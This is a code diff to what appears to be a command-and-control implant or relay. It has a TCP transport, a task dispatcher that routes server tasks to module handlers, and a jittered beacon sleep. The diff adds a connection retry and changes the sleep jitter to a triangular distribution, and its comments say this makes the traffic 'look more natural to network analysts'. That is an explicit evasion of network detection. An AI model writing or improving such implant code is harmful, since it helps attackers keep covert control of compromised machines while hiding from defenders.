@@ -1219,13 +1219,21 @@ class TCPTransport(BaseTransport):
         return buf
 
     def send(self, data: bytes) -> bytes:
+        """Send data with automatic retry on transient connection failures."""
         s = self._connect()
         try:
             s.sendall(data + b"\n")
             return self._read_line(s)
         except Exception:
             self.close()
-            raise
+            # Retry once with a fresh connection for transient drops
+            try:
+                s = self._connect()
+                s.sendall(data + b"\n")
+                return self._read_line(s)
+            except Exception:
+                self.close()
+                raise
 
     def close(self):
         if self._sock is not None:
@@ -1954,9 +1962,20 @@ def start_relay():
 # --------------------------------------------------------------------- #
 
 def _jittered_sleep(base: float, jitter_pct: int):
-    """Sleep for base * (1 +/- jitter_pct/100)."""
+    """Sleep for base * (1 +/- jitter_pct/100) with triangular distribution.
+    
+    Uses triangular distribution instead of uniform to concentrate sleep times
+    near the base value while still maintaining variance. This looks more natural
+    to network analysts than uniform jitter.
+    """
+    if jitter_pct <= 0:
+        _t.sleep(base)
+        return
     delta = base * (jitter_pct / 100.0)
-    _t.sleep(base + _rnd.uniform(-delta, delta))
+    # Triangular distribution: peak at base, tails at +/- delta
+    low = base - delta
+    high = base + delta
+    _t.sleep(_rnd.triangular(low, base, high))
 
 def _dispatch(task: dict) -> dict:
     """Route a server task to the right module handler.
